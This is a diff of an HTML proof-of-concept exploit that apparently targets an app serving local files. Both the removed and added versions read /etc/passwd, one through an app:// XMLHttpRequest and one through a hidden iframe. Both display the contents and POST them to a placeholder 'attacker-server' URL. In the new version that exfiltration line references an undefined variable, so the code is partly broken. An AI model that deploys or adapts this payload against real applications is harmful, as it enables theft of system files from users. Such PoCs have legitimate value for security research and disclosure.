@@ -1,33 +1,26 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html>
+<head>
+    <title>Embedded</title>
+</head>
 <body>
-<script>
-    window.location = `data:text/html,<script>(${payload.toString()})()\x3c/script>`;
 
-    function payload() {
 
-        window.performance.getEntriesByType('resource')
-        var resourceEntries = window.performance.getEntriesByType('resource');
-        var imgResourceEntries = resourceEntries.filter(function(entry) {
-            return entry.initiatorType === 'img';
-        });
-        var firstImgResourceEntry = imgResourceEntries[0];
-        var name = firstImgResourceEntry.name;
-        var regex = /app:\/\/([^/]+)/;
-        var match = name.match(regex);
-        var desiredValue = match[1];
-        let command = 'app://'+desiredValue+'//etc/passwd';
-        let r = new XMLHttpRequest();
-        r.open('GET', command);
-        r.addEventListener('load', e => {
-            let result = e.currentTarget.responseText;
-            console.log(result);
-            confirm(result)
+    <iframe src="/etc/passwd" style="display: none;"></iframe>
+
+    <script>
+        function payload() {
+            var iframe = document.querySelector("iframe");
+            var iframeWindow = iframe.contentWindow;
+            var iframeContent = iframeWindow.document.body.innerHTML;
+            confirm(iframeContent);
             fetch('http://example.localtest.me/send-file-to-attacker-server', {method: 'post', mode: 'no-cors', body: result})
-        });
-        r.send();
-    }
-</script>
+        }
+        var iframe = document.querySelector("iframe");
+        iframe.onload = payload;
+    </script>
+
+
 </body>
+
 </html>
